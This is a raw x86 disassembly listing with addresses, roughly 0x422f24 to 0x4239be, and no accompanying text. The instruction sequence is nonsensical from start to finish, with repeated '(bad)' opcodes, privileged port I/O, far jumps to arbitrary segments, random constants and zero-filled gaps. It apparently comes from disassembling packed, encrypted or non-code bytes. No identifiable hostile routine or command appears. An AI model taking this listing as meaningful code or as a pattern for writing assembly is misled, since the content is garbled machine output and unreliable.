  422f24:	sub    ebx,DWORD PTR [ebx]
  422f26:	mov    al,BYTE PTR [esi+0x5e]
  422f29:	loope  0x422f21
  422f2b:	cmp    BYTE PTR [edx-0x3465d00a],0x4e
  422f32:	cmp    eax,0x1500e8c
  422f37:	mov    BYTE PTR [esi+0x340ad5fd],cl
  422f3d:	inc    ebp
  422f3e:	sub    bl,BYTE PTR [ebx+0x3b65012e]
  422f44:	sub    ebx,ecx
  422f46:	aad    0xd5
  422f48:	shl    BYTE PTR [edx-0x63],cl
  422f4b:	ss sbb al,0xb5
  422f4e:	fst    DWORD PTR ds:0x9c6f31a1
  422f54:	ja     0x422ef3
  422f56:	push   ecx
  422f57:	jns    0x422f7d
  422f59:	cmp    al,0xa2
  422f5b:	pop    ds
  422f5c:	jnp    0x422f10
  422f5e:	sub    al,0xee
  422f60:	push   es
  422f61:	xor    DWORD PTR [eax+0x61f774ec],esp
  422f67:	xchg   ecx,eax
  422f68:	or     bl,BYTE PTR [edx]
  422f6a:	gs jge 0x422f62
  422f6d:	sub    eax,0xe874dcf9
  422f72:	pop    ds
  422f73:	inc    ebx
  422f74:	mov    dh,0xbf
  422f76:	lahf   
  422f77:	sbb    BYTE PTR [eax-0x3b],ah
  422f7a:	jmp    0x422f90
  422f7c:	mov    bl,BYTE PTR es:[edx+0x5930280]
  422f83:	mov    dl,0x33
  422f85:	mov    WORD PTR [ebx+ecx*4+0x4f],ss
  422f89:	fstp   DWORD PTR [edi+0x1f]
  422f8c:	pop    edi
  422f8d:	push   eax
  422f8e:	dec    ebp
  422f8f:	inc    edx
  422f90:	xchg   edi,eax
  422f91:	mov    ecx,DWORD PTR [ecx+ebx*1+0x510845b6]
  422f98:	xchg   ebp,eax
  422f99:	jnp    0x422f37
  422f9b:	inc    edi
  422f9c:	aad    0xd8
  422f9e:	mov    edx,0x65d81fdd
  422fa3:	fld    TBYTE PTR [edx+0x5]
  422fa6:	dec    eax
  422fa7:	sub    BYTE PTR cs:[edi],cl
  422faa:	mov    bl,dl
  422fac:	or     cl,BYTE PTR [edi+0x1e]
  422faf:	jle    0x422f7e
  422fb1:	mov    dh,0x95
  422fb3:	sbb    edi,DWORD PTR [esi+edi*4]
  422fb6:	(bad)  
  422fb7:	xchg   ebp,eax
  422fb8:	into   
  422fb9:	enter  0x1841,0x2a
  422fbd:	cwde   
  422fbe:	jp     0x423004
  422fc0:	pop    ds
  422fc1:	dec    esp
  422fc2:	std    
  422fc3:	ror    DWORD PTR [esi],cl
  422fc5:	popf   
  422fc6:	mov    al,ds:0x165956e0
  422fcb:	out    0xa3,al
  422fcd:	in     eax,0x4c
  422fcf:	adc    al,0x3e
  422fd1:	jno    0x422ff1
  422fd3:	outs   dx,BYTE PTR ds:[esi]
  422fd4:	sar    DWORD PTR [ecx],0xc4
  422fd7:	inc    edi
  422fd8:	cmp    DWORD PTR [ebp+0x8],0xd9b503e7
  422fdf:	jae    0x422fac
  422fe1:	mov    esp,0xc4a8f3c0
  422fe6:	push   esp
  422fe7:	jge    0x423049
  422fe9:	fmul   QWORD PTR [esi-0x4e]
  422fec:	jb     0x422ff2
  422fee:	ret    
  422fef:	daa    
  422ff0:	pop    ecx
  422ff1:	popa   
  422ff2:	xchg   edi,eax
  422ff3:	inc    ebp
  422ff4:	rol    al,cl
  422ff6:	xor    al,0x46
  422ff8:	retf   0xf33e
  422ffb:	and    al,0x2c
  422ffd:	jo     0x422fbd
  422fff:	shl    ebx,cl
  423001:	punpckhbw mm2,QWORD PTR [eax+0x5ec128a6]
  423008:	jg     0x422fed
  42300a:	(bad)  
  42300b:	sbb    ecx,ebp
  42300d:	sbb    al,0x89
  42300f:	add    DWORD PTR [eax],eax
	...
  423071:	add    BYTE PTR [eax],al
  423073:	add    BYTE PTR [esi-0x1c],al
  423076:	bound  ecx,QWORD PTR [eax-0x1111711e]
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [esp+eax*2+0x60cca4e1],esp
  423085:	jne    0x423088
  423087:	add    BYTE PTR [ecx+eax*1],al
  42308a:	add    BYTE PTR [eax],al
  42308c:	mov    dh,0xa9
  42308e:	sbb    al,0x2c
  423090:	lods   eax,DWORD PTR ds:[esi]
  423091:	jp     0x4230f9
  423093:	sbb    DWORD PTR [esi],esp
  423095:	cld    
  423096:	mov    bl,0xe8
  423098:	mov    WORD PTR [eax-0x41],?
  42309b:	mov    dl,0x2a
  42309d:	fsub   st,st(7)
  42309f:	xor    ebx,DWORD PTR [ebp+0x534a0121]
  4230a5:	xor    eax,0x92b7d773
  4230aa:	push   es
  4230ab:	or     DWORD PTR [eax+ebp*1-0x24],0xfffffff1
  4230b0:	xor    al,0x30
  4230b2:	xchg   edi,esp
  4230b4:	loop   0x423084
  4230b6:	push   edi
  4230b7:	inc    DWORD PTR [edx+0xa0f9820]
  4230bd:	push   esi
  4230be:	pop    ebx
  4230bf:	leave  
  4230c0:	xor    eax,0xbf19dffe
  4230c5:	mov    al,ss:0x1d1f6d4e
  4230cb:	mov    ch,0x6
  4230cd:	imul   edi,DWORD PTR [edx+0x5d],0xc4b5c562
  4230d4:	or     al,0x38
  4230d6:	and    esi,ecx
  4230d8:	sub    DWORD PTR [ebp+0x39],ebp
  4230db:	and    al,dh
  4230dd:	ret    0xeb48
  4230e0:	and    al,BYTE PTR [eax-0x43]
  4230e3:	xchg   edi,eax
  4230e4:	ja     0x423090
  4230e6:	inc    esi
  4230e7:	adc    eax,0x21c477e6
  4230ec:	push   0x583a42fe
  4230f1:	inc    ebp
  4230f2:	dec    esi
  4230f3:	adc    bl,dl
  4230f5:	outs   dx,DWORD PTR ds:[esi]
  4230f6:	repz ret 0xa20d
  4230fa:	xor    BYTE PTR ds:0x6ff6bb04,0x8e
  423101:	sub    BYTE PTR [edi-0x18],dh
  423104:	push   ecx
  423105:	retf   
  423106:	stc    
  423107:	jnp    0x423130
  423109:	mov    bl,BYTE PTR [ebx-0x23]
  42310c:	mov    eax,ds:0x442a2009
  423111:	(bad)  
  423112:	dec    ecx
  423113:	pop    esp
  423114:	xchg   DWORD PTR [edx],eax
  423116:	xchg   BYTE PTR [edx+0x9],al
  423119:	out    0x92,eax
  42311b:	test   ch,al
  42311d:	xor    al,0x2e
  42311f:	mov    DWORD PTR [edx],ebx
  423121:	cmc    
  423122:	jno    0x42314d
  423124:	retf   0xded9
  423127:	dec    DWORD PTR [ecx]
  423129:	jg     0x42313a
  42312b:	cdq    
  42312c:	or     ah,BYTE PTR [ebx+0xb8f9e14]
  423132:	loope  0x4231af
  423134:	inc    eax
  423135:	pop    edi
  423136:	jne    0x42313f
  423138:	les    eax,FWORD PTR [edx]
  42313a:	mov    cl,BYTE PTR [ecx]
  42313c:	popa   
  42313d:	xor    eax,0xbe72eac9
  423142:	xchg   BYTE PTR [ebx+0x5db8694a],al
  423148:	enter  0x9674,0x0
  42314c:	call   0xa2b7:0xfef95cb5
  423153:	mov    dh,0x48
  423155:	test   eax,0xedd65477
  42315a:	ss dec esi
  42315c:	jmp    0x8d50:0x68fcba80
  423163:	pop    edi
  423164:	enter  0xb7a8,0x5d
  423168:	mov    BYTE PTR [eax],dh
  42316a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42316b:	pop    edi
  42316c:	cmp    DWORD PTR [ecx],ebp
  42316e:	shr    BYTE PTR [ebp+0x583fab92],0x6d
  423175:	pop    edi
  423176:	mov    eax,0xbc0024b4
  42317b:	out    0xac,al
  42317d:	not    DWORD PTR [edx+0x2756e7c1]
  423183:	scas   al,BYTE PTR es:[edi]
  423184:	and    DWORD PTR [esi-0x80],esi
  423187:	sub    eax,0x1e1aa4be
  42318c:	in     al,0x1e
  42318e:	add    al,0x22
	...
  4231f4:	jns    0x4231e7
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx-0x2dfc2d86],esp
  423204:	fs jbe 0x423208
  423207:	add    BYTE PTR [ecx+eax*1],al
  42320a:	add    BYTE PTR [eax],al
  42320c:	repz push edi
  42320e:	jp     0x4231e7
  423210:	inc    eax
  423211:	push   esp
  423212:	fwait
  423213:	mov    bl,0x77
  423215:	mov    esp,0x8ae10a36
  42321a:	sar    BYTE PTR [eax],1
  42321c:	push   0xe
  42321e:	test   DWORD PTR [eax+0x16221193],0x5e2ab735
  423228:	push   cs
  423229:	sbb    esp,DWORD PTR [eax+0x6c]
  42322c:	xchg   BYTE PTR [ecx-0x2d],bl
  42322f:	pusha  
  423230:	fsubr  DWORD PTR [edi+0x4bcf66a8]
  423236:	leave  
  423237:	loop   0x42325f
  423239:	mov    edi,DWORD PTR [ecx+0x7324abf6]
  42323f:	mov    esi,0x182ddfc5
  423244:	sub    ch,BYTE PTR [eax]
  423246:	or     dh,BYTE PTR ds:0xa3a71946
  42324c:	xor    BYTE PTR [edx-0x2d1dc08c],al
  423252:	fiadd  DWORD PTR [esi+0x4a]
  423255:	repz scas al,BYTE PTR es:[edi]
  423257:	mov    edi,0x741f2fd1
  42325c:	xchg   edx,esp
  42325e:	mov    ch,0xe4
  423260:	inc    ebp
  423261:	push   ds
  423262:	push   ecx
  423263:	xchg   ecx,eax
  423264:	xor    ah,cl
  423266:	stc    
  423267:	mov    ecx,0x90bd1466
  42326c:	fldenv [edi+0x50]
  42326f:	repz mov bl,0x21
  423272:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423273:	pop    eax
  423274:	call   0xaa5b:0xbec6d698
  42327b:	test   DWORD PTR [edi-0x687b7f79],0x17b25a4e
  423285:	or     ch,bh
  423287:	arpl   WORD PTR [ecx],bp
  423289:	out    0x32,eax
  42328b:	lods   eax,DWORD PTR ds:[esi]
  42328c:	sbb    eax,0xa851bdbb
  423291:	(bad)  [ebp+0xa]
  423294:	rcl    DWORD PTR [eax-0x63],0x38
  423298:	outs   dx,DWORD PTR ds:[esi]
  423299:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42329a:	pop    edi
  42329b:	sbb    BYTE PTR [edx-0x54],dh
  42329e:	and    al,0x1b
  4232a0:	in     al,dx
  4232a1:	test   dl,bl
  4232a3:	(bad)  
  4232a4:	call   0x9885:0x751a4e46
  4232ab:	mov    eax,0xf52509f8
  4232b0:	std    
  4232b1:	lea    edi,[ebp-0x43a14b97]
  4232b7:	sbb    DWORD PTR [eax],0x7a
  4232ba:	dec    esp
  4232bb:	setge  BYTE PTR [ecx]
  4232be:	cmp    dh,ch
  4232c0:	and    dl,ch
  4232c2:	pop    ss
  4232c3:	sbb    cl,BYTE PTR ds:0xe57baeaf
  4232c9:	sub    al,0x5f
  4232cb:	jp     0x42334b
  4232cd:	sub    ecx,DWORD PTR ss:[ecx-0x159393f7]
  4232d4:	sahf   
  4232d5:	scas   eax,DWORD PTR es:[edi]
  4232d6:	and    DWORD PTR [eax],ecx
  4232d8:	std    
  4232d9:	sbb    BYTE PTR [ecx],al
  4232db:	mov    ebp,DWORD PTR [ebp-0x59]
  4232de:	fs test ebx,ebp
  4232e1:	sahf   
  4232e2:	xchg   edx,eax
  4232e3:	les    ecx,FWORD PTR [eax-0xaeba78b]
  4232e9:	or     BYTE PTR [ebp-0x20],ch
  4232ec:	adc    eax,0x1e30ad6a
  4232f1:	out    0x46,al
  4232f3:	xchg   DWORD PTR [ebp+0x9],ebp
  4232f6:	add    al,0xf5
  4232f8:	add    al,0xe
  4232fa:	cli    
  4232fb:	jp     0x42328d
  4232fd:	cmp    al,0x9f
  4232ff:	xchg   BYTE PTR [edx+0x2aec6a78],bl
  423305:	loop   0x423302
  423307:	dec    esp
  423308:	aam    0x11
  42330a:	cs jl  0x423344
  42330d:	and    dl,ah
  42330f:	pop    ss
	...
  423374:	clc    
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0xba130f44
  423382:	ficomp DWORD PTR [eax+0x17768]
  423388:	add    al,0x1
  42338a:	add    BYTE PTR [eax],al
  42338c:	jge    0x423372
  42338e:	mov    ds:0x56a3300a,eax
  423393:	fcomp  QWORD PTR [ebx+0x4eb77b5c]
  423399:	pusha  
  42339a:	cdq    
  42339b:	popa   
  42339c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42339d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42339e:	leave  
  42339f:	sub    BYTE PTR [ebx+ebx*8+0x1ee8aaf1],ch
  4233a6:	cmp    BYTE PTR [ecx],cl
  4233a8:	dec    ebp
  4233a9:	inc    ebp
  4233aa:	xchg   BYTE PTR [eax],ch
  4233ac:	or     BYTE PTR [esi],ch
  4233ae:	dec    edx
  4233af:	mov    esi,0xf1aeebce
  4233b4:	mov    ebp,0x8d4ec796
  4233b9:	jle    0x423348
  4233bb:	xor    eax,edx
  4233bd:	inc    eax
  4233be:	in     al,0xaf
  4233c0:	and    bl,ch
  4233c2:	dec    edi
  4233c3:	and    al,0x60
  4233c5:	enter  0x6cb2,0x20
  4233c9:	jecxz  0x4233a8
  4233cb:	imul   ebp,DWORD PTR [ebx-0x70],0x3f827aa1
  4233d2:	dec    esp
  4233d3:	cmp    ebp,DWORD PTR [ebx+0x6e2db0f9]
  4233d9:	popa   
  4233da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233db:	dec    ebx
  4233dc:	test   BYTE PTR [eax+0x6b48d47e],dh
  4233e2:	aad    0xa9
  4233e4:	push   ebx
  4233e5:	dec    ebp
  4233e6:	mov    esi,0x4a6454fb
  4233eb:	sbb    bl,0xb
  4233ee:	icebp  
  4233ef:	push   cs
  4233f0:	lds    edi,FWORD PTR [edi+0x39]
  4233f3:	clc    
  4233f4:	pop    edi
  4233f5:	inc    ebp
  4233f6:	cmp    eax,0x1441f666
  4233fb:	(bad)  
  4233fc:	cld    
  4233fd:	stos   DWORD PTR es:[edi],eax
  4233fe:	xchg   DWORD PTR [esi+0x2f],esp
  423401:	cmp    ah,cl
  423403:	mov    bh,0x38
  423405:	leave  
  423406:	mov    ecx,ecx
  423408:	cmp    BYTE PTR [edx+0x6c],ch
  42340b:	mov    esi,0x85797649
  423410:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423411:	shl    BYTE PTR [edi],0xbc
  423414:	xor    bl,BYTE PTR [ecx-0x30826a72]
  42341a:	xor    al,0x65
  42341c:	js     0x4233d9
  42341e:	xchg   edx,eax
  42341f:	jb     0x42349e
  423421:	adc    eax,eax
  423423:	mov    ah,0x8f
  423425:	fistp  DWORD PTR [edx-0x226b1fd6]
  42342b:	mov    BYTE PTR [ebx+0x2bdfc6c9],bh
  423431:	push   0xb06989a8
  423436:	popf   
  423437:	inc    ebx
  423438:	test   BYTE PTR [eax+0x13],ah
  42343b:	or     al,BYTE PTR [ecx]
  42343d:	(bad)  
  42343e:	jns    0x423480
  423440:	jne    0x42349c
  423442:	lods   eax,DWORD PTR ds:[esi]
  423443:	pop    esp
  423444:	pop    esi
  423445:	mov    bh,0x48
  423447:	inc    edx
  423448:	fisubr WORD PTR [ecx+edx*2]
  42344b:	sbb    al,0x95
  42344d:	mov    eax,DWORD PTR [edi+0x5fa60ee2]
  423453:	imul   edi,DWORD PTR [eax-0x5bbd8da5],0xfffffff2
  42345a:	(bad)  
  42345b:	push   esi
  42345c:	inc    eax
  42345d:	inc    edx
  42345e:	xchg   ebp,eax
  42345f:	out    0xe6,eax
  423461:	dec    ecx
  423462:	mov    bh,0xa6
  423464:	in     eax,dx
  423465:	dec    di
  423467:	hlt    
  423468:	pop    esp
  423469:	sbb    dh,bh
  42346b:	cmp    al,0x38
  42346d:	jp     0x423420
  42346f:	outs   dx,DWORD PTR ds:[esi]
  423470:	mov    ah,0xf2
  423472:	pop    ds
  423473:	leave  
  423474:	inc    eax
  423475:	adc    DWORD PTR [edx-0x3b],ebp
  423478:	mov    cl,0xc
  42347a:	mov    esp,0x36071aec
  42347f:	sbb    DWORD PTR [eax-0x35],ebp
  423482:	mov    edx,0xc329f301
  423487:	sub    eax,0x18eee561
  42348c:	stos   DWORD PTR es:[edi],eax
  42348d:	out    dx,al
  42348e:	jg     0x423462
	...
  4234f4:	shl    BYTE PTR [eax-0x8a90bb],0xea
  4234fb:	mov    edi,0x1fadf467
  423500:	add    al,0x47
  423502:	and    BYTE PTR ds:0x1786c,al
  423508:	add    al,0x1
  42350a:	add    BYTE PTR [eax],al
  42350c:	shl    BYTE PTR [edx+0x33ddc0ad],0x33
  423513:	jl     0x4234bb
  423515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423516:	sbb    eax,0x5fc6d574
  42351b:	mov    edx,0x8c694f9b
  423520:	or     DWORD PTR [edi+esi*1],ecx
  423523:	jle    0x423506
  423525:	jno    0x4234ce
  423527:	retf   0x58b4
  42352a:	fild   WORD PTR [ebp+0x70]
  42352d:	loope  0x423508
  42352f:	dec    eax
  423530:	jp     0x42358b
  423532:	aam    0xd2
  423534:	xor    dl,BYTE PTR [edi-0x5a8c6153]
  42353a:	jo     0x423543
  42353c:	mov    ds:0x3de21e62,eax
  423541:	add    DWORD PTR [eax+0x66a6f83b],esi
  423547:	mov    esp,0xf126dbbf
  42354c:	es mov bh,0xb1
  42354f:	int3   
  423550:	adc    BYTE PTR [ebp+0x30da31da],bl
  423556:	jns    0x4234ec
  423558:	jns    0x4235ae
  42355a:	call   0x26ce:0xa25eae0b
  423561:	jbe    0x423551
  423563:	or     DWORD PTR [eax],edi
  423565:	mov    bh,0x8d
  423567:	jl     0x423560
  423569:	jecxz  0x4235e2
  42356b:	cmp    BYTE PTR [eax-0x4c50db9f],al
  423571:	push   cs
  423572:	inc    bh
  423574:	pop    esp
  423575:	push   es
  423576:	leave  
  423577:	xchg   ebp,eax
  423578:	pop    esp
  423579:	test   DWORD PTR [edi+eax*1],0x62cf6ed9
  423580:	repz add bl,BYTE PTR [ebx-0x3b]
  423584:	mov    ebx,0xccce0eb
  423589:	sub    ecx,DWORD PTR [ebx]
  42358b:	sbb    eax,0xbc58e077
  423590:	add    DWORD PTR [esi+0x62],esp
  423593:	xor    bl,BYTE PTR [esi]
  423595:	retf   0x5907
  423598:	repz popa 
  42359a:	mov    al,ds:0xd15700c7
  42359f:	jge    0x4235db
  4235a1:	(bad)  
  4235a2:	rol    eax,cl
  4235a4:	jne    0x423565
  4235a6:	loop   0x423570
  4235a8:	xchg   ebp,eax
  4235a9:	enter  0x9963,0xdb
  4235ad:	pop    esp
  4235ae:	scas   al,BYTE PTR es:[edi]
  4235af:	mov    dl,0xd2
  4235b1:	adc    al,0x92
  4235b3:	mov    cl,0x4c
  4235b5:	das    
  4235b6:	and    eax,0x620b920a
  4235bb:	jb     0x423633
  4235bd:	pop    ebx
  4235be:	xor    dl,BYTE PTR [ebx+0xc]
  4235c1:	daa    
  4235c2:	add    ebp,ecx
  4235c4:	jmp    0x65ae35dc
  4235c9:	pusha  
  4235ca:	lock pop es
  4235cc:	dec    edi
  4235cd:	add    cl,dl
  4235cf:	mov    ebx,0xe2acd751
  4235d4:	mov    dh,0x9b
  4235d6:	xchg   edi,ecx
  4235d8:	loope  0x4235f4
  4235da:	bound  ecx,QWORD PTR [eax]
  4235dc:	neg    DWORD PTR [esi+0x30e7215a]
  4235e2:	enter  0xb677,0xe7
  4235e6:	hlt    
  4235e7:	sub    al,0xae
  4235e9:	sti    
  4235ea:	adc    dl,BYTE PTR ds:0x507fe8c9
  4235f0:	retf   0x4be
  4235f3:	sub    DWORD PTR [eax],eax
  4235f5:	mov    bh,0x2b
  4235f7:	add    ebx,ecx
  4235f9:	add    eax,0xd5c4d4a8
  4235fe:	dec    eax
  4235ff:	cli    
  423600:	je     0x423621
  423602:	jnp    0x423670
  423604:	inc    edi
  423605:	(bad)  
  423606:	adc    al,0xa3
  423608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423609:	call   0xdee82192
  42360e:	imul   edx,DWORD PTR [ebp+0x0],0x0
	...
  423672:	add    BYTE PTR [eax],al
  423674:	or     BYTE PTR [edi-0x8808b84],0x88
  42367b:	jmp    FWORD PTR [esi-0x6f]
  42367e:	jl     0x423693
  423680:	fwait
  423681:	dec    esi
  423682:	fiadd  WORD PTR [edi+0x17970]
  423688:	add    al,0x1
  42368a:	add    BYTE PTR [eax],al
  42368c:	pop    ecx
  42368d:	mov    edi,0x69a0b1a9
  423692:	in     eax,0x17
  423694:	xchg   esp,eax
  423695:	popf   
  423696:	mov    eax,ds:0x439cf414
  42369b:	push   es
  42369c:	in     eax,0x12
  42369e:	jmp    0x4236d2
  4236a0:	jne    0x423718
  4236a2:	mov    edx,0x11579ac1
  4236a7:	jp     0x423645
  4236a9:	stos   BYTE PTR es:[edi],al
  4236aa:	xor    al,0x8b
  4236ac:	outs   dx,BYTE PTR ds:[esi]
  4236ad:	(bad)  
  4236ae:	and    DWORD PTR [ecx],edx
  4236b0:	xlat   BYTE PTR ds:[ebx]
  4236b1:	mov    bh,0x6b
  4236b3:	cmp    ah,bh
  4236b5:	add    DWORD PTR [eax-0x434b1030],esp
  4236bb:	cmp    ch,dl
  4236bd:	fs loop 0x42366c
  4236c0:	cdq    
  4236c1:	mov    eax,0x828dfdb
  4236c6:	out    0x66,eax
  4236c8:	inc    edi
  4236c9:	sbb    DWORD PTR [ebp-0x4d],esp
  4236cc:	retf   
  4236cd:	add    DWORD PTR [ebx],ecx
  4236cf:	cli    
  4236d0:	les    ebx,FWORD PTR [eax+0x7a]
  4236d3:	inc    ecx
  4236d4:	xchg   ebp,eax
  4236d5:	xchg   ebx,eax
  4236d6:	adc    bh,dl
  4236d8:	push   0x21
  4236da:	ret    0x55a9
  4236dd:	mov    bl,bl
  4236df:	int    0x5b
  4236e1:	push   ecx
  4236e2:	mov    bl,0x44
  4236e4:	dec    edx
  4236e5:	push   ds
  4236e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236e7:	std    
  4236e8:	retf   
  4236e9:	jecxz  0x42370e
  4236eb:	iret   
  4236ec:	retf   0x1d2
  4236ef:	ss in  eax,dx
  4236f1:	jb     0x423766
  4236f3:	(bad)  
  4236f4:	daa    
  4236f5:	adc    esi,DWORD PTR [ecx]
  4236f7:	inc    esp
  4236f8:	xchg   BYTE PTR [eax],al
  4236fa:	inc    ecx
  4236fb:	dec    edx
  4236fc:	cli    
  4236fd:	sbb    ecx,edi
  4236ff:	pop    esp
  423700:	xor    DWORD PTR [di-0x276e],edi
  423705:	and    DWORD PTR [esi-0x47],ecx
  423708:	int    0x89
  42370a:	sbb    al,0x91
  42370c:	gs ins DWORD PTR es:[edi],dx
  42370e:	lods   al,BYTE PTR ds:[esi]
  42370f:	stc    
  423710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423711:	xchg   BYTE PTR [ebp-0x24],cl
  423714:	inc    edi
  423715:	retf   
  423716:	cld    
  423717:	das    
  423718:	(bad)  
  423719:	mov    dl,0x57
  42371b:	test   eax,0xedb155fc
  423720:	std    
  423721:	xor    ebp,ecx
  423723:	adc    eax,0x795a7b75
  423728:	jmp    0xc9d0:0x17b672cd
  42372f:	jmp    0x7819267a
  423734:	adc    DWORD PTR [ebx+0x54b4bdda],ecx
  42373a:	xchg   ecx,eax
  42373b:	test   al,0x86
  42373d:	sbb    BYTE PTR ds:[eax+edx*4-0x21],bh
  423742:	ror    DWORD PTR [edx+0x7f],cl
  423745:	dec    esp
  423746:	push   ds
  423747:	jno    0x4236d7
  423749:	jb     0x42372a
  42374b:	cs jns 0x423781
  42374e:	adc    BYTE PTR [ebp+eax*1+0x45],0xe3
  423753:	(bad)  
  423754:	adc    BYTE PTR [esi+eax*1-0x66bd2761],bl
  42375b:	lods   eax,DWORD PTR ds:[esi]
  42375c:	or     ebp,ebp
  42375e:	fwait
  42375f:	mov    eax,ds:0xf71b9c41
  423764:	daa    
  423765:	dec    edx
  423766:	mov    cl,0xaa
  423768:	sub    BYTE PTR [esi-0x23cfb762],ch
  42376e:	loopne 0x4237aa
  423770:	lds    ecx,FWORD PTR [eax]
  423772:	and    eax,DWORD PTR [ecx]
  423774:	imul   edi,DWORD PTR [ecx-0x59ba88c1],0x7
  42377b:	adc    edi,DWORD PTR [eax+0x25]
  42377e:	mov    ebx,0x7c12fc1f
  423783:	mov    al,ds:0x8cb7d67e
  423789:	sbb    DWORD PTR [edi+0x55],ecx
  42378c:	fwait
  42378d:	jp     0x423741
  42378f:	pop    ds
	...
  4237f4:	xor    al,0x23
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7a74:0xfb4d1967
  423806:	add    DWORD PTR [eax],eax
  423808:	add    al,0x1
  42380a:	add    BYTE PTR [eax],al
  42380c:	push   ebp
  42380d:	addr16 jge 0x4237c4
  423810:	(bad)  
  423811:	stc    
  423812:	sbb    DWORD PTR [ecx+0x38],esp
  423815:	test   eax,0xe0c0d8cf
  42381a:	ja     0x4237b6
  42381c:	scas   al,BYTE PTR es:[edi]
  42381d:	xchg   edi,eax
  42381e:	sbb    al,0x95
  423820:	iret   
  423821:	mov    ch,0xa4
  423823:	adc    BYTE PTR [esi+edi*1],cl
  423826:	push   ecx
  423827:	mov    ebx,0x3276cf12
  42382c:	shr    DWORD PTR [ebp+0x7159eac5],0x45
  423833:	neg    DWORD PTR [esi-0x5eececa5]
  423839:	dec    edx
  42383a:	hlt    
  42383b:	rcr    DWORD PTR [ebx-0x75],0x9c
  42383f:	rol    BYTE PTR [eax-0x24855b16],0x29
  423846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423847:	jno    0x42382a
  423849:	pop    ebx
  42384a:	and    eax,ecx
  42384c:	jb     0x423873
  42384e:	inc    eax
  42384f:	push   ebp
  423850:	pushf  
  423851:	ss (bad) 
  423853:	mov    ds:0xe34a6dc6,al
  423858:	adc    al,BYTE PTR [eax+eiz*2]
  42385b:	jmp    0x8794d999
  423860:	mov    esi,0x330810b3
  423865:	mov    dl,0xee
  423867:	jg     0x423804
  423869:	xor    dh,BYTE PTR [ecx]
  42386b:	(bad)  
  42386c:	popa   
  42386d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42386e:	jnp    0x4238b9
  423870:	cs add al,0xd8
  423873:	movlps xmm1,QWORD PTR [edi+0x18]
  423877:	mov    al,0xd0
  423879:	sub    ah,BYTE PTR [esp+eax*4+0x44]
  42387d:	into   
  42387e:	sbb    al,0x51
  423880:	pop    ecx
  423881:	arpl   WORD PTR [ecx+0x49],sp
  423884:	xchg   edi,eax
  423885:	imul   ebx,DWORD PTR [eax-0x41],0x63a2a1b9
  42388c:	xchg   DWORD PTR [esi+edi*8-0xa],eax
  423890:	icebp  
  423891:	fsubr  QWORD PTR [ebx+0x3385a2a3]
  423897:	jbe    0x423862
  423899:	adc    ebx,DWORD PTR [edx+0x3c03fcf0]
  42389f:	mov    ebp,0x734552d1
  4238a4:	mov    ebx,0xa1f74823
  4238a9:	jge    0x423874
  4238ab:	mov    ds:0xeeb3d4ce,eax
  4238b0:	sbb    al,0x25
  4238b2:	adc    DWORD PTR [edi+0x1a],esi
  4238b5:	test   DWORD PTR ds:0xca3f8ca3,ecx
  4238bb:	pop    edx
  4238bc:	addr16 push ds
  4238be:	push   esi
  4238bf:	call   0xcce5:0x8232e314
  4238c6:	out    0xd8,al
  4238c8:	sbb    al,0x1c
  4238ca:	inc    eax
  4238cb:	xor    al,0xfa
  4238cd:	fadd   QWORD PTR [edi+ebx*1-0x1]
  4238d1:	pop    ecx
  4238d2:	xor    eax,0xf10b7f10
  4238d7:	dec    edx
  4238d8:	not    esp
  4238da:	xchg   DWORD PTR [ebx+0x3cce3549],edx
  4238e0:	adc    al,cl
  4238e2:	jae    0x4238fa
  4238e4:	repnz xor BYTE PTR [ecx],bh
  4238e7:	cmp    BYTE PTR [ebp-0x7216e62c],ah
  4238ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238ee:	sub    BYTE PTR [ecx+0x4dea06bd],dl
  4238f4:	hlt    
  4238f5:	mov    bh,0xe5
  4238f7:	(bad)  
  4238f9:	sub    BYTE PTR [ecx],bl
  4238fb:	cmp    al,0x6d
  4238fd:	imul   esi,DWORD PTR [edi+0x33d65f99],0xafaec63a
  423907:	pop    ecx
  423908:	fcom   QWORD PTR [edx]
  42390a:	cmp    bh,BYTE PTR [ebp+edx*2+0x55d975]
	...
  423971:	add    BYTE PTR [eax],al
  423973:	add    BYTE PTR [edx-0x770e5c],cl
  423979:	(bad)  
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0x71a2bbd
  423982:	mov    eax,ds:0x17b781c
  423987:	add    BYTE PTR [ecx+eax*1],al
  42398a:	add    BYTE PTR [eax],al
  42398c:	hlt    
  42398d:	and    DWORD PTR [esp+eax*4+0x19],edi
  423991:	cmc    
  423992:	adc    eax,0xeccf39c7
  423997:	ret    0x4aa6
  42399a:	jle    0x4239ca
  42399c:	in     al,0x34
  42399e:	ss mov cl,0x80
  4239a1:	push   edi
  4239a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239a3:	in     eax,dx
  4239a4:	rcr    dl,1
  4239a6:	mov    WORD PTR [edi],?
  4239a8:	mov    ah,0x1f
  4239aa:	(bad)  
  4239ab:	jmp    0xe2ec:0xdd4ad79
  4239b2:	jbe    0x42398a
  4239b4:	in     eax,dx
  4239b5:	adc    BYTE PTR [edi+0x690af2ba],ch
  4239bb:	(bad)  
  4239bc:	fsub   st,st(4)
  4239be:	sbb    esp,edx
